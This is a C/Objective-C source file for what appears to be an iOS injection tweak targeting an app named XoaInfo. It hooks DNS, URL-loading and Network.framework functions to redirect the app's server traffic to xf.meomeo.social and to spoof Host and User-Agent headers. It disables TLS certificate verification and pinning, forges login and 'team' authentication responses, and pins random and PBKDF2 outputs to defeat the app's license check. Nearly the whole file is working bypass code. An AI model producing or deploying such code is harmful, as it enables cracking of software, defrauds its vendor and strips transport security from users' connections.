static void *my_nw_endpoint_create_host(const char *hostname, const char *port) {
    if (is_c2_target(hostname)) {
        c2log("nw_endpoint_create_host REDIRECT", hostname, REDIRECT_HOST);
        hostname = REDIRECT_HOST;
    }
    if (orig_nw_endpoint_create_host) {
        return orig_nw_endpoint_create_host(hostname, port);
    }
    return nw_endpoint_create_host(hostname, port);
}

static void my_sec_protocol_options_set_tls_server_name(void *options, const char *server_name) {
    if (is_c2_target(server_name)) {
        c2log("sec_protocol_options_set_tls_server_name REDIRECT", server_name, REDIRECT_HOST);
        server_name = REDIRECT_HOST;
    }
    if (orig_sec_protocol_options_set_tls_server_name) {
        orig_sec_protocol_options_set_tls_server_name(options, server_name);
    } else {
        sec_protocol_options_set_tls_server_name(options, server_name);
    }
}

typedef void (^sec_protocol_verify_complete_t)(int verified);
typedef void (^sec_protocol_verify_t)(void *metadata, void *trust, sec_protocol_verify_complete_t complete);

static void my_sec_protocol_options_set_verify_block(void *options, void *block, void *queue) {
    c2log("sec_protocol_options_set_verify_block (Installing persistent SSL bypass block)", NULL, NULL);
    static sec_protocol_verify_t bypass_block = 0;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        bypass_block = ^(void *metadata, void *trust, sec_protocol_verify_complete_t complete) {
            c2log("SSL verify block executed -> reporting TLS valid (1)", NULL, NULL);
            if (complete) {
                complete(1);
            }
        };
    });
    if (orig_sec_protocol_options_set_verify_block) {
        orig_sec_protocol_options_set_verify_block(options, (__bridge void*)bypass_block, queue);
    } else {
        sec_protocol_options_set_verify_block(options, (__bridge void*)bypass_block, queue);
    }
}

// ==============================================================================
// 2. libSystem DNS & Hostname Interception
// ==============================================================================
static int my_getaddrinfo(const char *hostname, const char *servname, const struct addrinfo *hints, struct addrinfo **res) {
    if (is_c2_target(hostname)) {
        c2log("getaddrinfo REDIRECT", hostname, REDIRECT_HOST);
        hostname = REDIRECT_HOST;
    }
    if (orig_getaddrinfo) {
        return orig_getaddrinfo(hostname, servname, hints, res);
    }
    return getaddrinfo(hostname, servname, hints, res);
}

static void *my_gethostbyname(const char *name) {
    if (is_c2_target(name)) {
        c2log("gethostbyname REDIRECT", name, REDIRECT_HOST);
        name = REDIRECT_HOST;
    }
    if (orig_gethostbyname) {
        return orig_gethostbyname(name);
    }
    return gethostbyname(name);
}

// ==============================================================================
// 3. Security.framework SSL Pinning Bypass
// ==============================================================================
static int my_SecTrustEvaluateWithError(void *trust, void **error) {
    c2log("SecTrustEvaluateWithError bypassed -> returning 1", NULL, NULL);
    if (error) *error = (void*)0;
    return 1;
}

static int my_SecTrustEvaluate(void *trust, int *result) {
    c2log("SecTrustEvaluate bypassed -> returning 0 / Proceed", NULL, NULL);
    if (result) *result = 1; // kSecTrustResultProceed
    return 0; // errSecSuccess
}

// ==============================================================================
// 4. ObjC tlsVerified Bypass (Prevents Login button immediate trap crash)
// ==============================================================================
static BOOL hook_tlsVerified(id self, SEL _cmd) {
    c2log("tlsVerified check -> ALWAYS returning YES (1)", NULL, NULL);
    return YES;
}

// ==============================================================================
// 5. ObjC URL & Host Header Redirection (Fixes Cloudflare 403 Host Mismatch)
// ==============================================================================

// Forward declaration — defined in "Saved IMPs" section below
static id (*orig_url_URLWithString)(id, SEL, id);

static id redirectURLString(id urlStr) {
    if (!urlStr) return urlStr;
    Class nss = objc_getClass("NSString");
    Class nsu = objc_getClass("NSURL");
    if (!nss || !nsu) return urlStr;

    const char *orig_c = ((const char*(*)(id,SEL))objc_msgSend)(urlStr, sel_registerName("UTF8String"));
    if (!orig_c || strstr(orig_c, REDIRECT_HOST)) return urlStr;
    if (!is_c2_target(orig_c)) return urlStr;

    SEL replSel = sel_registerName("stringByReplacingOccurrencesOfString:withString:");
    id redirStr = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), REDIRECT_HOST);

    // Use orig (un-hooked) URLWithString to avoid infinite recursion via our own hook
    id tempURL = orig_url_URLWithString
        ? orig_url_URLWithString((id)nsu, sel_registerName("URLWithString:"), urlStr)
        : NULL;
    id currentStr = urlStr;
    if (tempURL) {
        id host = ((id(*)(id,SEL))objc_msgSend)(tempURL, sel_registerName("host"));
        if (host) {
            const char *host_c = ((const char*(*)(id,SEL))objc_msgSend)(host, sel_registerName("UTF8String"));
            if (is_c2_target(host_c)) {
                currentStr = ((id(*)(id,SEL,id,id))objc_msgSend)(urlStr, replSel, host, redirStr);
            }
        }
    }

    const char *new_c = ((const char*(*)(id,SEL))objc_msgSend)(currentStr, sel_registerName("UTF8String"));
    if (new_c && strcmp(orig_c, new_c) != 0) {
        c2log("ObjC URLString Redirected", orig_c, new_c);
    }
    return currentStr;
}

static id redirectURL(id url) {
    if (!url) return url;
    Class nsu = objc_getClass("NSURL");
    if (!nsu) return url;

    id urlStr = ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("absoluteString"));
    if (!urlStr) return url;

    id newStr = redirectURLString(urlStr);
    if (newStr == urlStr) return url;

    id newURL = ((id(*)(id,SEL,id))objc_msgSend)((id)nsu, sel_registerName("URLWithString:"), newStr);
    return newURL ? newURL : url;
}

static id redirectRequestObj(id req) {
    if (!req) return req;
    id url = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("URL"));
    id newURL = redirectURL(url);

    id mreq = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("mutableCopy"));
    if (mreq) {
        if (newURL && newURL != url) {
            ((void(*)(id,SEL,id))objc_msgSend)(mreq, sel_registerName("setURL:"), newURL);
        }
        Class nss = objc_getClass("NSString");
        if (nss) {
            // 1. Inject Browser User-Agent to bypass Cloudflare Error 1010
            id uaVal = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), DEFAULT_UA);
            id uaKey = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), "User-Agent");
            if (uaVal && uaKey) {
                ((void(*)(id,SEL,id,id))objc_msgSend)(mreq, sel_registerName("setValue:forHTTPHeaderField:"), uaVal, uaKey);
            }
            // 2. Set Host header to xf.meomeo.social to avoid Cloudflare 403 Host Mismatch
            id hostVal = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), REDIRECT_HOST);
            id hostKey = ((id(*)(id,SEL,const char*))objc_msgSend)((id)nss, sel_registerName("stringWithUTF8String:"), "Host");
            if (hostVal && hostKey) {
                ((void(*)(id,SEL,id,id))objc_msgSend)(mreq, sel_registerName("setValue:forHTTPHeaderField:"), hostVal, hostKey);
            }
        }
        return mreq;
    }
    return req;
}

// Saved IMPs
static id (*orig_url_URLWithString)(id, SEL, id);
static id (*orig_url_initWithString)(id, SEL, id);
static id (*orig_req_requestWithURL)(id, SEL, id);
static id (*orig_req_initWithURL)(id, SEL, id);
static id (*orig_req_initWithURLFull)(id, SEL, id, long, double);
static id (*orig_mreq_requestWithURL)(id, SEL, id);
static id (*orig_mreq_initWithURL)(id, SEL, id);
static id (*orig_mreq_initWithURLFull)(id, SEL, id, long, double);
static void (*orig_mreq_setURL)(id, SEL, id);
static id (*orig_sess_dataTaskWithURL)(id, SEL, id);
static id (*orig_sess_dataTaskWithURLCompletion)(id, SEL, id, id);
static id (*orig_sess_dataTaskWithRequest)(id, SEL, id);
static id (*orig_sess_dataTaskWithRequestCompletion)(id, SEL, id, id);
static id (*orig_conn_sendSync)(id, SEL, id, void*, void*);
static id (*orig_conn_initWithRequest)(id, SEL, id, id);

// Hook implementations
static id hook_url_URLWithString(id self, SEL _cmd, id str) {
    return orig_url_URLWithString(self, _cmd, redirectURLString(str));
}

static id hook_url_initWithString(id self, SEL _cmd, id str) {
    return orig_url_initWithString(self, _cmd, redirectURLString(str));
}

static id hook_req_requestWithURL(id self, SEL _cmd, id url) {
    return orig_req_requestWithURL(self, _cmd, redirectURL(url));
}

static id hook_req_initWithURL(id self, SEL _cmd, id url) {
    return orig_req_initWithURL(self, _cmd, redirectURL(url));
}

static id hook_req_initWithURLFull(id self, SEL _cmd, id url, long policy, double timeout) {
    return orig_req_initWithURLFull(self, _cmd, redirectURL(url), policy, timeout);
}

static id hook_mreq_requestWithURL(id self, SEL _cmd, id url) {
    return orig_mreq_requestWithURL(self, _cmd, redirectURL(url));
}

static id hook_mreq_initWithURL(id self, SEL _cmd, id url) {
    return orig_mreq_initWithURL(self, _cmd, redirectURL(url));
}

static id hook_mreq_initWithURLFull(id self, SEL _cmd, id url, long policy, double timeout) {
    return orig_mreq_initWithURLFull(self, _cmd, redirectURL(url), policy, timeout);
}

static void hook_mreq_setURL(id self, SEL _cmd, id url) {
    orig_mreq_setURL(self, _cmd, redirectURL(url));
}

static id hook_sess_dataTaskWithURL(id self, SEL _cmd, id url) {
    return orig_sess_dataTaskWithURL(self, _cmd, redirectURL(url));
}

static id hook_sess_dataTaskWithURLCompletion(id self, SEL _cmd, id url, id block) {
    return orig_sess_dataTaskWithURLCompletion(self, _cmd, redirectURL(url), block);
}

static id hook_sess_dataTaskWithRequest(id self, SEL _cmd, id req) {
    return orig_sess_dataTaskWithRequest(self, _cmd, redirectRequestObj(req));
}

// Helper: get URL-encoded params string (as id/NSString*) from request
static id req_params(id req) {
    id body = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("HTTPBody"));
    if (body) {
        id s = ((id(*)(id,SEL,id,unsigned long))objc_msgSend)(
            ((id(*)(id,SEL))objc_msgSend)((id)objc_getClass("NSString"), sel_registerName("alloc")),
            sel_registerName("initWithData:encoding:"), body, (unsigned long)4);
        if (s) return s;
    }
    id url = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("URL"));
    return url ? ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("query")) : nil;
}

static id hook_sess_dataTaskWithRequestCompletion(id self, SEL _cmd, id req, id block) {
    id url = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("URL"));
    id host_ns = url ? ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("host")) : nil;
    id path_ns = url ? ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("path")) : nil;
    const char *host_c = host_ns ? ((const char*(*)(id,SEL))objc_msgSend)(host_ns, sel_registerName("UTF8String")) : NULL;
    const char *path_c = path_ns ? ((const char*(*)(id,SEL))objc_msgSend)(path_ns, sel_registerName("UTF8String")) : NULL;

    // Accept BOTH the original C2 host AND the redirect host (xf.meomeo.social).
    // The NSURL/NSURLRequest hooks run before this hook and rewrite the host to
    // REDIRECT_HOST first, so by the time we see the request, host_c is already
    // REDIRECT_HOST — which is excluded by is_c2_target to prevent redirect loops.
    // Checking for REDIRECT_HOST here catches that pre-redirected case.
    int is_auth_host = host_c && (is_c2_target(host_c) || strcmp(host_c, REDIRECT_HOST) == 0);

    if (is_auth_host && path_c && block) {
        id params = req_params(req);
        id fake = nil;
        if (strstr(path_c, "loginip")) {
            fake = build_fake_loginip(params ?: @"");
            if (fake) {
                c2log("FAKE-AUTH inject loginip", NULL, NULL);
            } else {
                c2log("FAKE-AUTH loginip build FAILED (orig_CCKeyDerivationPBKDF NULL?)", NULL, NULL);
            }
        } else if (strstr(path_c, "team")) {
            fake = build_fake_team(params ?: @"");
            if (fake) {
                c2log("FAKE-AUTH inject team", NULL, NULL);
            } else {
                c2log("FAKE-AUTH team build FAILED (orig_CCKeyDerivationPBKDF NULL?)", NULL, NULL);
            }
        } else {
            // Catch-all: return 200 OK for any other C2 path to prevent indefinite
            // hangs on unknown endpoints (reset data, version check, etc.).
            static const char ok_body[] = "ok";
            fake = ((id(*)(id,SEL,const void*,unsigned long))objc_msgSend)(
                (id)objc_getClass("NSData"), sel_registerName("dataWithBytes:length:"),
                ok_body, 2UL);
            c2log("FAKE-AUTH catch-all 200 OK for", path_c, NULL);
        }
        if (fake) {
            return inject_fake_and_cancel(self, req, fake, block,
                orig_sess_dataTaskWithRequestCompletion);
        }
    }
    return orig_sess_dataTaskWithRequestCompletion(self, _cmd, redirectRequestObj(req), block);
}

static id hook_conn_sendSync(id self, SEL _cmd, id req, void *resp, void *err) {
    id url = ((id(*)(id,SEL))objc_msgSend)(req, sel_registerName("URL"));
    id host_ns = url ? ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("host")) : nil;
    id path_ns = url ? ((id(*)(id,SEL))objc_msgSend)(url, sel_registerName("path")) : nil;
    const char *host_c = host_ns ? ((const char*(*)(id,SEL))objc_msgSend)(host_ns, sel_registerName("UTF8String")) : NULL;
    const char *path_c = path_ns ? ((const char*(*)(id,SEL))objc_msgSend)(path_ns, sel_registerName("UTF8String")) : NULL;

    int is_auth_host = host_c && (is_c2_target(host_c) || strcmp(host_c, REDIRECT_HOST) == 0);
    if (is_auth_host && path_c) {
        id params = req_params(req);
        id fake = nil;
        if (strstr(path_c, "loginip")) {
            fake = build_fake_loginip(params ?: @"");
            c2log("FAKE-AUTH inject loginip sync (no mock server)", NULL, NULL);
        } else if (strstr(path_c, "team")) {
            fake = build_fake_team(params ?: @"");
            c2log("FAKE-AUTH inject team sync (no mock server)", NULL, NULL);
        }
        if (fake) {
            if (resp) {
                id r = ((id(*)(id,SEL,id,long,id,id))objc_msgSend)(
                    ((id(*)(id,SEL))objc_msgSend)((id)objc_getClass("NSHTTPURLResponse"), sel_registerName("alloc")),
                    sel_registerName("initWithURL:statusCode:HTTPVersion:headerFields:"),
                    url, (long)200,
                    ((id(*)(id,SEL,const char*))objc_msgSend)((id)objc_getClass("NSString"),
                        sel_registerName("stringWithUTF8String:"), "HTTP/1.1"), nil);
                *(__unsafe_unretained id*)resp = r;
            }
            return fake;
        }
    }
    return orig_conn_sendSync(self, _cmd, redirectRequestObj(req), resp, err);
}

static id hook_conn_initWithRequest(id self, SEL _cmd, id req, id delegate) {
    return orig_conn_initWithRequest(self, _cmd, redirectRequestObj(req), delegate);
}

static void hookMethod(Class cls, const char *selName, IMP newIMP, IMP *origIMP, int isClassMethod) {
    if (!cls) return;
    SEL sel = sel_registerName(selName);
    Method m = isClassMethod ? class_getClassMethod(cls, sel) : class_getInstanceMethod(cls, sel);
    if (!m) return;
    *origIMP = method_getImplementation(m);
    method_setImplementation(m, newIMP);
}

// ==============================================================================
// 6. Dynamic Substrate / ElleKit Function Hook Registration
// ==============================================================================
typedef void (*MSHookFunction_t)(void *symbol, void *hook, void **old);

static void install_dynamic_c_hooks(void) {
    void *hElle = dlopen("/usr/lib/libellekit.dylib", 2 /* RTLD_NOW */);
    if (!hElle) hElle = dlopen("libellekit.dylib", 2);
    if (!hElle) hElle = dlopen("/usr/lib/libsubstrate.dylib", 2);
    if (!hElle) hElle = dlopen("libsubstrate.dylib", 2);

    MSHookFunction_t msHook = NULL;
    if (hElle) {
        msHook = (MSHookFunction_t)dlsym(hElle, "MSHookFunction");
        if (!msHook) msHook = (MSHookFunction_t)dlsym(hElle, "DobbyHook");
        if (!msHook) msHook = (MSHookFunction_t)dlsym(hElle, "LBHookFunction");
    }
    if (!msHook) {
        msHook = (MSHookFunction_t)dlsym((void*)-2, "MSHookFunction");
    }
    if (!msHook) {
        msHook = (MSHookFunction_t)dlsym((void*)-2, "DobbyHook");
    }

    if (msHook) {
        c2log("MSHookFunction/DobbyHook found in ElleKit -> installing C hooks", NULL, NULL);
        void *fn_nw_host = dlsym((void*)-2, "nw_endpoint_create_host");
        if (fn_nw_host) {
            msHook(fn_nw_host, (void*)my_nw_endpoint_create_host, (void**)&orig_nw_endpoint_create_host);
        }
        void *fn_tls_sni = dlsym((void*)-2, "sec_protocol_options_set_tls_server_name");
        if (fn_tls_sni) {
            msHook(fn_tls_sni, (void*)my_sec_protocol_options_set_tls_server_name, (void**)&orig_sec_protocol_options_set_tls_server_name);
        }
        void *fn_tls_verify = dlsym((void*)-2, "sec_protocol_options_set_verify_block");
        if (fn_tls_verify) {
            msHook(fn_tls_verify, (void*)my_sec_protocol_options_set_verify_block, (void**)&orig_sec_protocol_options_set_verify_block);
        }
        void *fn_gai = dlsym((void*)-2, "getaddrinfo");
        if (fn_gai) {
            msHook(fn_gai, (void*)my_getaddrinfo, (void**)&orig_getaddrinfo);
        }
        void *fn_ghbn = dlsym((void*)-2, "gethostbyname");
        if (fn_ghbn) {
            msHook(fn_ghbn, (void*)my_gethostbyname, (void**)&orig_gethostbyname);
        }
        void *fn_ste = dlsym((void*)-2, "SecTrustEvaluateWithError");
        if (fn_ste) {
            msHook(fn_ste, (void*)my_SecTrustEvaluateWithError, (void**)&orig_SecTrustEvaluateWithError);
        }
        void *fn_ste_old = dlsym((void*)-2, "SecTrustEvaluate");
        if (fn_ste_old) {
            msHook(fn_ste_old, (void*)my_SecTrustEvaluate, (void**)&orig_SecTrustEvaluate);
        }
        void *fn_arc4 = dlsym((void*)-2, "arc4random_uniform");
        if (fn_arc4) {
            msHook(fn_arc4, (void*)my_arc4random_uniform, (void**)&orig_arc4random_uniform);
            c2log("arc4random_uniform hooked -> team_v19 pinned to 13981", NULL, NULL);
        }
        void *fn_md5 = dlsym((void*)-2, "CC_MD5");
        if (fn_md5) {
            msHook(fn_md5, (void*)my_CC_MD5, (void**)&orig_CC_MD5_hook);
            c2log("CC_MD5 hooked for X-formula diagnosis", NULL, NULL);
        }
        void *fn_pbkdf2 = dlsym((void*)-2, "CCKeyDerivationPBKDF");
        if (fn_pbkdf2) {
            msHook(fn_pbkdf2, (void*)my_CCKeyDerivationPBKDF, (void**)&orig_CCKeyDerivationPBKDF);
            c2log("CCKeyDerivationPBKDF hooked -> team_v19 pinned at PBKDF2 level", NULL, NULL);
        }
    } else {
        c2log("WARNING: MSHookFunction not found in global runtime", NULL, NULL);
    }
}

// ==============================================================================
// 7. Constructor (Runs on injection)
// ==============================================================================
__attribute__((constructor))
static void C2RedirectInit(void) {
    if (!is_target_process()) {
        return;
    }

    c2log_raw("=================================================");
    c2log_raw("[C2Redirect] ACTIVE - Initializing hooks for XoaInfo");
    c2log("Redirect target", REDIRECT_HOST, NULL);
    c2log_raw("=================================================");

    // 1. Dynamic C-level hooks
    install_dynamic_c_hooks();

    // 2. Foundation ObjC Hooks
    Class urlCls  = objc_getClass("NSURL");
    Class reqCls  = objc_getClass("NSURLRequest");
    Class mreqCls = objc_getClass("NSMutableURLRequest");
    Class sessCls = objc_getClass("NSURLSession");
    Class connCls = objc_getClass("NSURLConnection");

    if (urlCls) {
        hookMethod(urlCls, "URLWithString:", (IMP)hook_url_URLWithString, (IMP*)&orig_url_URLWithString, 1);
        hookMethod(urlCls, "initWithString:", (IMP)hook_url_initWithString, (IMP*)&orig_url_initWithString, 0);
    }
    if (reqCls) {
        hookMethod(reqCls, "requestWithURL:", (IMP)hook_req_requestWithURL, (IMP*)&orig_req_requestWithURL, 1);
        hookMethod(reqCls, "initWithURL:", (IMP)hook_req_initWithURL, (IMP*)&orig_req_initWithURL, 0);
        hookMethod(reqCls, "initWithURL:cachePolicy:timeoutInterval:", (IMP)hook_req_initWithURLFull, (IMP*)&orig_req_initWithURLFull, 0);
    }
    if (mreqCls) {
        hookMethod(mreqCls, "requestWithURL:", (IMP)hook_mreq_requestWithURL, (IMP*)&orig_mreq_requestWithURL, 1);
        hookMethod(mreqCls, "initWithURL:", (IMP)hook_mreq_initWithURL, (IMP*)&orig_mreq_initWithURL, 0);
        hookMethod(mreqCls, "initWithURL:cachePolicy:timeoutInterval:", (IMP)hook_mreq_initWithURLFull, (IMP*)&orig_mreq_initWithURLFull, 0);
        hookMethod(mreqCls, "setURL:", (IMP)hook_mreq_setURL, (IMP*)&orig_mreq_setURL, 0);
    }
    if (sessCls) {
        hookMethod(sessCls, "dataTaskWithURL:", (IMP)hook_sess_dataTaskWithURL, (IMP*)&orig_sess_dataTaskWithURL, 0);
        hookMethod(sessCls, "dataTaskWithURL:completionHandler:", (IMP)hook_sess_dataTaskWithURLCompletion, (IMP*)&orig_sess_dataTaskWithURLCompletion, 0);
        hookMethod(sessCls, "dataTaskWithRequest:", (IMP)hook_sess_dataTaskWithRequest, (IMP*)&orig_sess_dataTaskWithRequest, 0);
        hookMethod(sessCls, "dataTaskWithRequest:completionHandler:", (IMP)hook_sess_dataTaskWithRequestCompletion, (IMP*)&orig_sess_dataTaskWithRequestCompletion, 0);
    }
    if (connCls) {
        hookMethod(connCls, "sendSynchronousRequest:returningResponse:error:", (IMP)hook_conn_sendSync, (IMP*)&orig_conn_sendSync, 1);
        hookMethod(connCls, "initWithRequest:delegate:", (IMP)hook_conn_initWithRequest, (IMP*)&orig_conn_initWithRequest, 0);
    }

    // 3. Swizzle tlsVerified across all runtime classes to bypass pre-flight crash
    SEL sel_tls = sel_registerName("tlsVerified");
    unsigned int numClasses = 0;
    Class *classList = objc_copyClassList(&numClasses);
    if (classList) {
        for (unsigned int i = 0; i < numClasses; i++) {
            Class cls = classList[i];
            Method m = class_getInstanceMethod(cls, sel_tls);
            if (m) {
                method_setImplementation(m, (IMP)hook_tlsVerified);
                c2log("Bypassed tlsVerified instance method on", class_getName(cls), NULL);
            }
            Method cm = class_getClassMethod(cls, sel_tls);
            if (cm) {
                method_setImplementation(cm, (IMP)hook_tlsVerified);
                c2log("Bypassed tlsVerified class method on", class_getName(cls), NULL);
            }
        }
        free(classList);
    }

    c2log_raw("[C2Redirect] All hooks initialized successfully.");
}
